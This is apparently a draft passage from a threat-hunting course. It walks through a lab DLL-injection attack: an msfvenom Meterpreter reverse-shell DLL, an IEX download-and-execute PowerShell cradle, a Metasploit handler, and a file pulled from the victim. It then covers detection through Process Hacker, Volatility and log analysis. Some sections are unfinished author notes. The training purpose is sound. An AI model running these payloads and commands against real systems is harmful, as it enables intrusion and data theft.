
{{< figure src="/img/image034.png" title="" class="custom-figure" >}}

5. Next we'll just create a simple text file on the desktop which will basically emulate the "nuclear codes" the threat actor is after. Right-click on the dekstop, `New` > `Text document`, give it a name and add some generic content. 

{{< figure src="/img/image035.png" title="" class="custom-figure" >}}

6. And the final step before we get going is starting a Wireshark pcap recording. In the search bar write `WireShark` and open it. Under `Capture` you will see the available interfaces, in my case the one we want is called `Ethernet0` - yours may or may not have the same name. How do you know which is the correct one? Look at the little graphs next to the names only one should have little spikes representing actual network traffic, the rest are likely all flat. It's the active one, ie the one with traffic, we want - see image below. Once you've identified it, simply double-click on it, this then starts the recording. 

{{< figure src="/img/image036.png" title="" class="custom-figure" >}}

Great now that everything is setup let's generate our stager and transfer it over to the victim. 
1. On our Kali VM open your terminal.
2. We are going to run the command below, which will generate a payload for us using `msfvenom` (a standalone app that is part of the Metasploit framework). Note the following:
- `Lhost` is the IP of the **listening** machine, ie the attacker. Yours will be different than mine here, adapt it!
- `Lport` is the port we will be listening on. This could be anything really, you can see in this case I chose an arbitraty port 88. You should be aware however that some victim systems may have strict rules regarding which outbound ports are allowed to be used, in these cases a standard port such as 80/443 would be a safer choice. Feel free to experiment/choose any port you'd like\
- `-f` designates the file type, which of course is DLL in this case.
- `>` indicates where we wish to save it, as well as the name we are giving to it, you can see I am saving it on my desktop as `evil.dll` - very subtle!

```
sudo msfvenom -p windows/meterpreter/reverse_tcp Lhost=192.168.230.155 Lport=88 -f dll > /home/hacker/Desktop/evil.dll
```

{{< figure src="/img/image037.png" title="" class="custom-figure" >}}

3. Next we want to tranfer our malicious DLL over to the victim. There are a myriad ways in which you can achieve this, so feel free to follow my example, or use any other technique you prefer. Still on our Kali VM navigate to the directory where you saved your payload, in my case this is on the desktop. We'll now create a very simply http server by running a single python command (see below). Again `8008` represents an arbitrary port, feel free to choose something else

```
python3 -m http.server 8008
```

{{< figure src="/img/image038.png" title="" class="custom-figure" >}}

4. Now we'll head over to the victim's system, we can either run a powershell command to download the file, or very simply open the browser (Edge) and type in the address bar write `http://[IP of hacker]:[port of http server]`, for example:

{{< figure src="/img/image039.png" title="" class="custom-figure" >}}

5. As you can see in the image above, you should see the dll file. If you don't, you either did not generate it, OR most likely you are not running the http server from the same directory. Now simply right-click on the DLL, `Save link as`, and in my case I will save it to desktop. Note that Edge may block the download, for example: 

{{< figure src="/img/image040.png" title="" class="custom-figure" >}}

If this is the case, click on the three dots `...` to the right of this message (More actions), and select `Keep`. You'll be confronted with another warning, select `Show more`, then `Keep anyway`. That should have finally done the trick!

{{< figure src="/img/image042.png" title="" class="custom-figure" >}}

Ok, we now have our malicious DLL on the victim's disk. 

6. So as we shared in the theory section of this course, this initial stager does one thing (at least on main thing): it calls back to the attacking machine to establish a connection and put in motion the subsequent series of events. But we can't run it just yet since we need something on our attacking machine that is actually listening and awaiting that call, ie the handler. So let's head over to our Kali VM, and in the terminal we'll run the following commands:
- `msfconsole`: this will open our metasploit console. 
- ` use exploit/multi/handler`: this sets up a generic payload handler inside the Metasploit framework. The `multi` in the command denotes that this is a handler that can be used with any exploit module, as it is not specific to any particular exploit or target system. The `handler` part of the command tells Metasploit to wait for incoming connections from payloads. Once the exploit is executed on the target system, the payload will create a connection back to the handler which is waiting for the incoming connection.
- `set payload windows/meterpreter/reverse_tcp`:  tells Metasploit what payload to use in conjunction with the previously selected exploit. The payload is the code that will be executed on the target system after a successful exploit. `windows`: This tells the framework that the target system is running Windows. `meterpreter`: Meterpreter is a sophisticated payload that provides an environment for controlling, manipulating, and navigating the target machine. `reverse_tcp`: This creates a reverse TCP connection from the target system back to the attacker's system. When the payload is executed on the target system, it will initiate a TCP connection back to the attacker’s machine (where Metasploit is running).

{{< figure src="/img/image043.png" title="" class="custom-figure" >}}

7. We now need to set required parameters, to see which ones are required run `show options`.

{{< figure src="/img/image044.png" title="" class="custom-figure" >}}

We can see there are 3 required parameters. The first one `EXITFUNC` is good as is. Meaning we need only to provide values for `LHOST` and `LPORT`, which is the exact same value we provided when we generated our `msfvenom` stager in step 2 - ie the attacker IP, as well as the port we chose (**88**).

8. We can now set these values with two commands:
- `set LHOST 192.168.230.155` (Note: change IP to YOURS)
- `set LPORT 88`

{{< figure src="/img/image045.png" title="" class="custom-figure" >}}

9. Now to start the listener we can use one of two commands, there's literally no difference. You can either use `run`, or `exploit`. 

{{< figure src="/img/image046.png" title="" class="custom-figure" >}}

So now that we have our handler listening for a callback we can go back to our Windows VM to run the code. 

**Performing the standard DLL-injection**

Next we need to perform a bit of Macgyvering...

{{< figure src="/img/macgyver.gif" title="" class="custom-figure" >}}

Here's the thing - to perform the injection we need another script which will get an actual process to inject `evil.dll` into its memory space. By far the most common and effective script to perform this is called [`Invoke-DllInjection.ps1`.](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-DllInjection.ps1)

Usually in order to run this next attack we'll use a PowerShell command to download the script [directly from the original github repo](https://github.com/PowerShellMafia/PowerSploit) and inject it directly into memory. The unfortunate thing is that this incredible artifact has not been updated in a few years, and since it's also been archived it's unlikely it ever will. 

The code as it currently stands on the original repo is however broken, at least when I tried it (in multiple configurations). The good news though is I found a simple fix and have updated the script which is now being hosted on [my github repo here](https://raw.githubusercontent.com/faanross/threat.hunting.course.01.resources/main/Invoke-DllInjection-V2.ps1).

And thus, just so you are aware, we are going to download and inject into memory the script from my personal Github repo but **in no way whatsoever do I want to appear as taking any credit/ownership for it**. The original link, as well as a reference to where I found the fix, can be found in the opening comments in the script itself, feel free to refer to them if you want. 

1. Back on our Windows VM we'll open an administrative PowerShell terminal - a reminder that in order to do so you have to right-click on PowerShell and select `Run as Administrator`. 

{{< figure src="/img/image047.png" title="" class="custom-figure" >}}

2. Now we'll run the following command, as mentioned before: it's going to download a script hosted on a webserver and then inject it directly into memory. This is a good example of what living off the land is all about - utilizing everyday components while not leaving any residue on the hard drive. 

```
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/faanross/threat.hunting.course.01.resources/main/Invoke-DllInjection-V2.ps1')
```

Note that after you run it there won't be any feedback/output. In case you did not know this is almost universally true: when it comes to PowerShell, not receiving any feedback/output almost always means the command ran succesfully. If there was an error, you'll get some red text telling you what went wrong. 

OK so let's just hold back for a second. At this point, if you have your wits about you, you might be calling shenanigans. 

{{< figure src="/img/shenanigans.gif" title="" class="custom-figure" >}}

"Wait", I hear you say, "if the whole point of infecting the victim and getting C2 control established is so that we can run commands on it, isn't it cheating then to be running these commands ahead of that actually happening? We've now both downloaded the DLL file and run another command to download a script from a webserver and inject it into memory and it's not like the victim is going to do that for us. So what gives?"

Well, here the simple answer - this is a threat hunting course. And so we are "cheating" in a sense with the goal of saving to save the time of crafting an actual spearphishing email, which if done correctly will do both the things we did here manually (ie download DLL and inject remotely-hosted script into memory). If you wanted a more realistic simulation of the Initial Compromise, well there are courses-a-plenty on it (I provide some links below), so please explore your intellecutal curiosites to your heart's complete content. But for now, we're streamling all the peripheral actions so we can focus on the heart of this course - threat hunting. 

Great so the script that will inject `evil.dll` into a process memory space is now in memory. But to be clear: though we've injected that script into memory, but we've not yet executed it. We're about to do so, but before that there's one thing we need. Remeber in the beginning when I explained about how dll-injections work I said that we basically "trick" a legit process into running code from a malicious DLL. So this script is what's going to be doing the trickery, we of course have our malicious DLL which we transferred over, so taht means we only need a legit process.

Now it used to be the case that you could eaasily inject into any process, including native Windows processes like notepad and calculator. You'll notice if you do some older tutorials, they'll almopst always choose one of these two as the example. However, though there are potential workarounds, this has become more ciomplicated since Windows 10 - if you're curious to know why [see here.](https://security.stackexchange.com/questions/197409/why-doesnt-dll-injection-works-on-windows-10-for-native-windows-binaries-e-g)

So as to not overcomplicate things, and because it's not really all that unrealistic to expect a non-native Windows executable to be running on a victim's system, I'll be running a portable executable called rufus.exe. It's a very small, simple program that creates bootable usb drives, but taht's irrelevant we just need some process. If you really wanted to run the same thing you can [get it here](https://rufus.ie/en/), otherwise feel free to run any other program as longs as its not a native Windows one. 

3. So we will run `rufus.exe`. But since we'll need to pass its Process ID (PID) to the script as an argument, we just need to find that real quick. You can either run Task Manager from the gui, or here I'll be running `ps` in PowerShell. And we can see here the PID is 784.

{{< figure src="/img/image048.png" title="" class="custom-figure" >}}

4. And now all the pieces are in place so we can run the actual command below. We can note that we provide it two things, first the PID of the legit process we want to inject into, and the path to the DLL we want to be injected. So run the command in the same administrative PowerShell terminal. 

```
Invoke-DllInjection -ProcessID 784 -Dll C:\Users\User\Desktop\evil.dll
```

{{< figure src="/img/image049.png" title="" class="custom-figure" >}}

5. We see some output, now to know if it worked let's head on back to our Kali VM. We can immediately see that we received the connection and are now in a `meterpreter` shell - success!

{{< figure src="/img/popped_shell.gif" title="" class="custom-figure" >}}

{{< figure src="/img/image050.png" title="" class="custom-figure" >}}

6. We can run a few commands if we'd like, also we'll exfiltrate the "nuclear launch codes" we created in the beginning. 

```
download C:\\Users\\user\\Desktop\\top_seekrit.txt /home/hacker/Desktop/
```
{{< figure src="/img/image051.png" title="" class="custom-figure" >}}

Additionally, we can also drop into a `shell`.

{{< figure src="/img/image052.png" title="" class="custom-figure" >}}

So that's it for our attack! Let's stop our traffic packet capture:
1. Open WireShark.
2. Press the red STOP button.
3. Save the file, in my case I will save it to desktop as `dllattack.pcap`.


And while this connection is still going we'll jump right into live memory analysis. Ok so just so we don't end up just learning a bunch of "arbitraty" diagnostic properties to look out for we have to go on a brief side quest to gather some Theory Berries of Enhanced Insight that has the property of helping our party gain greater insight into what we should be looking for, and more importantly - why.

***

# SIDE QUEST: The theoretical berries of C2 beacon live reading

{{< figure src="/img/quest02.gif" title="" class="custom-figure" >}}

So here we'll discuss a few things we'll be on the lookout for that can serve as red flags. BUT, it's very important to know that there are **NO silver bullet**. There are no hard and fast rules where if we see any of the following we can be 100% sure we're dealing with malware. After all, if we could codify the rule there would be no need for us as threat hunters to do it ourselves - it would be trivial to simply write a program that does it automatically for us.

Thus we'll be on the lookout for a handful of distinct signals, but these are almost always guideposts that help us figure out what needs deeper investigation. Even if somethin shows ALL the signs we list below, this would rather simply mean that we will then run further tests. For example if we see a process bearing many of these traits and we're sufficeintly suspicious we'd likely then have the SOC create a rule and scan the rest of the network. If we for example use **Least Frequency Analysis** and we see the process only occurs on one or two system - well yeah then it's time to get in touch with DFIR. 

Here's a quick overview of our list:
1. Parent-Child relationships
2. Signature - is it valid + who signed?
3. Current directory
4. Command-line arguments 
5. Thread Start Address
6. Memory Permissions
7. Memory Content

Note that 1-4 are not unique to dll-injections, but malware in general. Conversely, 5-7 are characteristics we expect only to see related to dll-injections. 

**Parent-Child relationships**
- As we know there exists a tree-like relationship between processes in Windows, meaning an existing process (called the Parent), tpyically spawns other processes (called the Child).

OK FINISH THIS LATER NOW UIT IS RUNNING SO LET'S RUN THROUGH HERE

Note: have to review Eric Conrad and Chad Tilbury to beef out the first few


***

# PART 3: Live Memory Analysis

Open Process Hacker as admin - ie right-click and select `Run as administrator`. Scroll down until you see `rufus.exe` (or whatever other legitimate process you chose to inject into). We can now look at our 7 signs.

1. Parent-Child relationships

{{< figure src="/img/image053.png" title="" class="custom-figure" >}}

- TBH even though I said there is no silver bullet, nothing that can lead to 100% certainty, this first sign is HIGHLY SUSPECT. Why?
- Well first off we can see `rufus`, and then that it itself spawned `rundll32.exe`.
- There's two things suspect about this. 
- First, we know that `rundll32.exe` is legitimate Windows process used to launch DLLs. But, since we also know that `rufus` is used to create bootable USB drives we have to ask ourselves: why on earth would this need to run `rundll32.exe`? Logically it makes no sense, and if we Google for example `rufus.exe spawn rundll32.exe` and there are no clean hits, well it certainly raises suspicion.
- Further, `rundll32.exe` itself is often invovled in malware for a number of reasons - it can be used to execute malicious code concealed in a DLL, it can be used for persistence by associating itself with a DLL and a commonly-called function, and `rundll32.exe` can be misused to initiate or maintain communication with the C2 server. 
- Further it is also very often associated with the most popular C2 framework for advanced groups - `Cobalt Strike`. Why? Simply because Raphael Mudge, the creator of the Cobalt Strike, decided to name the default dll spawned by `rundll32.exe`. Though this can be renamed in the Cobalt Strike config, it turns out, perhaps somewhat surprisingly; that most hackers don't do this. So more than 50% if Cobalt Strike is present on your system you'd expect to see `rundll32.exe`.
- All this to say: it's sus to see `rufus` spawning `rundll32.exe`, the fact that it is itself `rundll32.exe` is even more sus, but HOLY SMOKES the most sketchy thing of all is what we see in the next relationship - `rundll32.exe` spawning `cmd.exe`.
- I just said before that `rundll32.exe` is typically used to launch DLLs. Thus there is **very** little reason for us to expect it to be spawning the Windows command line interpreter `cmd.exe`. Now it could be that some amateur developer wrote some janky code that does this as some workaround, but in honesty if you see this you should get ready to dig in deeper. So let's do that by double-clicking on `rundll32.exe` to bring up its properties.

2. Signature - is it valid + who signed?

{{< figure src="/img/image054.png" title="" class="custom-figure" >}}

- We can see here that it has a valid signature signed by Microsoft, since of course they are the creators of rundll32.exe.

3. Current directory
- On the same image we can see the **Current directory**, that is the "working directory" of the process, which is the directory where the process was started from or where it is operating.
- We can see here that the Current directory is the Desktop since that's where it was initiated from. 
- Now this could happen with legitimate scripts or applications that are using rundll32.exe to call a DLL function.
- However, seeing rundll32.exe being called from an unusual location like a user's desktop could be suspicious, particularly if it's coupled with other strange behavior. 

4. Command-line arguments 
- And again in reference to the same image once more we see that the **Command-line** is `rundll32.exe`. 
- This is actually very unusual - the `rundll32.exe`` command is typically used to execute a function in a specific DLL file, and thus, you would normally see it accompanied by arguments specifying the DLL file and function it's supposed to execute. 
- For example, a legitimate command might look something like this: `rundll32.exe shell32.dll,Control_RunDLL`.
- Thus it being "nude" can certainly be seen as another point for Team Suspect.

5. Thread Start Address
- In the top of the Properties window select `Threads`.
{{< figure src="/img/image055.png" title="" class="custom-figure" >}}
- We can see under `Start address` that it is mapped, meaning it does exist on disk.
- So this just tells us that this is not a Reflectively Loaded DLL, since we would expect that to have an unknown address listed as `0x0`.

6. Memory Permissions
- In the top of the Properties window select `Memory`.
- Now click once on the `Protection` header to sort it. 
- Scroll down until you see `RWX` permissions, that is of course if it exists.
{{< figure src="/img/image056.png" title="" class="custom-figure" >}}
- And indeed we see the presence of two memory spaces with **Read-Write-Execute** permissions, which as we learned is always unusual/suspect.

7. Memory Content
- Finally let's double-click on the larger of the two (172 kB) since this typically represents the payload.
{{< figure src="/img/image057.png" title="" class="custom-figure" >}}
- And immediately we can see two clear giveaways that we are dealing with a PE file: first we see the magic bytes (`MZ`), and we see the strings we associate with a PE Dos Stub - `This program cannot be run in DOS mode`.
- So once again it seems suspect. 

That's it for our live analysis: feel free to exit Process Hacker. Let's discuss our results before dumping the memory and moving on to our post-mortem analysis. 

ANALYSIS
add a table here
review results, conclusions we can come to, next steps etc.

**Memory Dump**
One final thing before we kill the connection and start our post-mortem analysis: we need to dump the memory. 
1. Open a `Command Prompt` as administrator. 
2. Navigate to the directory where you saved `winpmem`.
3. We'll run the following command, meaning it will dump the memory and save it as `memdump.raw` in our present directory

```
winpmem.exe memdump.raw
```

Feel free to shut down the Kali VM - this will of course kill the connection but for now that's not an issue since we have everything we need: a memory dump, a traffic packet capture, and logs (WEL, PowerShell, Sysmon). 

***

# PART 4: Post-Mortem Memory Analysis

First thing's first - we need to transfer all our artifacts over from the Windows VM to our Ubuntu analyst VM. There are a number of ways to do this, and if you have your own method you prefer please do go ahead. I'm going to install python3 so we can quickly spin up a simply http server and transfer it that way.

But before we do that, let's aggregate all our data.
1. (opt) For simplicity I am going to create a new folder on the desktop called `artifacts`.
2. Copy your pcap (traffic packet capture) into it, in my case it's `dllattack.pcap` located on the desktop.
3. Then copy your memory dump into the same folder, in my case again it was saved to desktop as `memdump.raw`.
4. Now we'll need to copy the logs over, first we'll do the WEL logs. Open an administrative PowerShell terminal and run the following command:

```
Copy-Item -Path "C:\Windows\System32\winevt\Logs\System.evtx","C:\Windows\System32\winevt\Logs\Application.evtx","C:\Windows\System32\winevt\Logs\Security.evtx" -Destination "C:\Users\User\Desktop\artifacts"
```
5. Now we'll do the Sysmon logs, for this we'll need to convert it into an .evtx file wherafter we can save it directly in our `artifacts` directory. 

```
wevtutil epl "Microsoft-Windows-Sysmon/Operational" "C:\Users\User\Desktop\artifacts\Sysmon.evtx"
```
6. Finally we'll do the same for the PowerShell Script Block Logs.
```
wevtutil epl "Microsoft-Windows-PowerShell/Operational" "C:\Users\User\Desktop\artifacts\PowerShell.evtx"
```

Great so in your `artifacts` folder you should now have the following itesms - see image below.

{{< figure src="/img/image060.png" title="" class="custom-figure" >}}

We're now ready to transfer the files over.
1. First download the Python3 installer [here](https://www.python.org/downloads/windows/). 
2. Then simply run the installer, all default selections.
3. Once it's done open an administrative `Command Prompt` and navigate to the `artifacts` folder.
4. We can now spawn our **http server**.
```
python -m http.server 8008
```
5. You will more than likely receive a Windows Security Alert, click Allow Access.

{{< figure src="/img/image058.png" title="" class="custom-figure" >}}
6. Now head on over to your Ubuntu analyst VM and open the browser (FireFox). Navigate to `http://[windows_IP]:8008`, in my case that would be `http://192.168.230.158:8008`.

{{< figure src="/img/image061.png" title="" class="custom-figure" >}}

7. Now you can simply go ahead and save each of the files to wherever you want - for simplicity's sake I will be saving them all directly to the desktop in another folder called `artifacts`.

Now that we have all the data on the analyst system we're free to start analysis. Note you are free to close the Windows VM, for the rest of the course we'll only be using the Ubuntu VM.

We'll now start our Post-Mortem Memory Analysis, but in case you are interested here is a short little overview of the tool we'll be working with, Volatility. 

# VOLATILITY THEORY
Volatility is an open-source memory forensics framework used to extract digital artifacts from volatile memory (RAM) dumps. It's developed in Python and allows us to investigate potential malicious activity by looking processes, network connections and much, much more.

It takes a sort of modular approach where you use different plug-ins (seperate `.py` scripts) to perform specific tasks - for example `pslist` gives us an overview of processes while `netstat` gives us statistics about network connections. There are a few dozen such plug-ins and you can either write your own.  

For this course we'll be exploring the following 6 and I strongly encourage you to explore others to become more familiar with this great tool.
- pslist
- handles
- cmdline
- netscan
- malfind

# ANALYSIS WITH VOLATILITY
**pslist**
Two of the most common/popular plugs-ins are `pslist` and `pstree`. The former gives us a list of all processes including some key details, `pstree` conversely will also show Parent-Child relationships.

We won't go into these plug-ins very deep right now because, in essence, we already gleamed most of the insights it has to offer during our live analysis. But it is good to be aware, if for whatever reason you were not able to perform the live analysis but did come in possession of the memory dump, then effectively you can through a perhaps somewhat more convoluted manner arrive at the same insights. 

I will however quickly run `psinfo` below just so we get the PID of our suspicious process, we'll use that with other plug-ins. 

1. Open a terminal and navigate your your main Volatility3 directory, in my case it is `/home/analyst/Desktop/volatility3`.
2. Let's run our `psinfo` plugin using the following command:
```
python3 vol.py -f ~/Desktop/artifacts/memdump.raw windows.pslist 
```
3. Scroll down until you see `rundll32.exe` and note it's PID, you can see in my example below it's `5060`, we'll use this for our next plug-in. 

{{< figure src="/img/image062.png" title="" class="custom-figure" >}}

**handles**
Now that we've got the PID of our suspicious program we're going to look at its handles. 

A handle is like a reference that a program uses to access a resource - whether that be files, registry keys, or network connections. When a process wants to access one of these resources, the operating system gives it a handle, kind of like a ticket, that the process uses to read from or write to the resource.

For threat hunting it's a great idea to look at the handles of any process you consider suspect since it will give you a lot of information about what a process is actually doing. For instance, if a process has a handle to a sensitive file or network connection that it shouldn't have access to, it could be a sign of malicious activity. By examining the handles, we can get a clearer picture of what the suspicious process is up to, helping you understand its purpose and potentially identify the nature of the threat.

Now to be frank this analysis of handles can be a rather complex endeavour, relying on a deep techincal understanding of the subject. So I'll show how it works, and of course provide some insight on the findings, but be aware that I won't be able to do an exhaustive exploration of this topic as that could be a multi-hour course in and of itself. 

So let's run the `windows.handles` plugin with the following command, including the PID of `rundll32.exe` as we just learned. 
```
python3 vol.py -f ~/Desktop/artifacts/memdump.raw windows.handles --pid 5060
``` 

We see a large number of output, too much to meaningfully process right now. However what immediately sticks out is `Key` - meaning registry keys. So let's run the same search but utilize `grep` to only see all handles to registry keys:
```
python3 vol.py -f ~/Desktop/artifacts/memdump.raw windows.handles --pid 5060 | grep Key
``` 
We can see all the results in the image below:

{{< figure src="/img/image063.png" title="" class="custom-figure" >}}

Again, as has been the case before: nothing here is inherently indicative of malware. However, in the case where we suspect something of being malware, many of these registry key handles are commonly absed by malware. 

`MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\IMAGE FILE EXECUTION OPTIONS`: 
This key is commonly used to debug applications in Windows. However, it is also used by some malware to intercept the execution of programs. Malware can create a debugger entry for a certain program, and then reroute its execution to a malicious program instead.

`MACHINE\SYSTEM\CONTROLSET001\CONTROL\NLS\SORTING\VERSIONS`: This key is related to National Language Support (NLS) and the sorting of strings in various languages. It's uncommon for applications to directly interact with these keys. If the process is modifying this key, it may be an attempt to affect system behavior or mask its activity.

`MACHINE\SYSTEM\CONTROLSET001\CONTROL\NETWORKPROVIDER\HWORDER and MACHINE\SYSTEM\CONTROLSET001\CONTROL\NETWORKPROVIDER\PROVIDERORDER`: These keys are related to the order in which network providers are accessed in Windows. Modification of these keys may indicate an attempt to intercept or manipulate network connections.

`MACHINE\SYSTEM\CONTROLSET001\SERVICES\WINSOCK2\PARAMETERS\PROTOCOL_CATALOG9 and MACHINE\SYSTEM\CONTROLSET001\SERVICES\WINSOCK2\PARAMETERS\NAMESPACE_CATALOG5`: These keys are related to the Winsock API, which is used by applications to communicate over a network. If the process is interacting with these keys, it could be trying to manipulate network communication, which is a common tactic of malware.

=============================
**cmdline**

The `cmdline` is another useful plug-in I'm mentioning because I wanted you to be aware of it, even though we won't learn anything new from it in this specific case. Running the command below we'll see a history of all the command prompt, inlcuding `rundll32.exe`. So again we learn here, as we did in the live analysis, that it ran without any expected arguments. In the case a live analysis was not feasible, we'd once again be able to attain that same insight here in the post-mortem analysis. 

```
python3 vol.py -f ~/Desktop/artifacts/memdump.raw windows.cmdline.CmdLine --pid 5060 | grep Key
``` 

**netscan**
The `netscan` plugin will scan the memory dump looking for any network connections and sockets made by the OS.

You can run the scan using the following command:
```
python3 vol.py -f ~/Desktop/artifacts/memdump.raw windows.netscan
```

Right now I'll defer comment, since we're going to jump into network connections DEEPLY in PART X with `Wireshark`, `Zeek`, and `RITA`. I just wanted you to be aware that you can also use a memory dump to look at network connections if for some reason you don't have a packet capture available.   

**malfind**
`malfind` is the quintessential plugin for, well, finding malware. The plugin will look for suspected inject code, which it determines based on header info - much indeed like we did during our live analysis in steps 6 and 7. 

We can run it with:
```
python3 vol.py -f ~/Desktop/artifacts/memdump.raw windows.malfind
```
Below is a sample of the result, which is quite extensive:

{{< figure src="/img/image064.png" title="" class="custom-figure" >}}

We can see that it correctly flagged `rundll32.exe`. However, if we go through the entire list we can see a number of false positives: 
- RuntimeBroker.exe
- SearchApp.exe
- powershell.exe
- smartscreen.exe

This is thus a good reminder that the mere appearance of a process in malfind's output is not an unequivocal affirmation of its malicious nature.

**Closing Thoughts**
This section was admitrtedly not all-too revelatory. But that's really because we have already performed live analysis, and thus we can say the point of performing post-mortem analysis is really:
- to strengthen the case/conviction of suspicious malware identified during live analysis, or
- in the case that live analysis was unfeasible, much of the same data/insights could be obtained here with Volatility3.

I think this a good introduction to Volatility3, though we could obviously go much deeper I'll leave that for our next course. 

SO for now let's jump straight into log analysis with an emphasis on UEBA.

***

# PART X: LOG ANALYSIS AND UEBA

Time for us to get into some LOGGING...

{{< figure src="/img/lumberjack.gif" title="" class="custom-figure" >}}

No, not that kinda logging.

The kind which, admittedly, is not too exicting. 

Here let's touch on some regular logging. 




# DeepBlueCLI

OK big change: we have to run this on Windows
So remove part where you install it on Linux, install on Windows instead,
don't shut windows off
no need to trasnfer it over (logs) to Linux

`Set-ExecutionPolicy unrestricted`
warning
`A`

`.\DeepBlue.ps1 ..\artifacts\Security.evtx`
warning
`R`
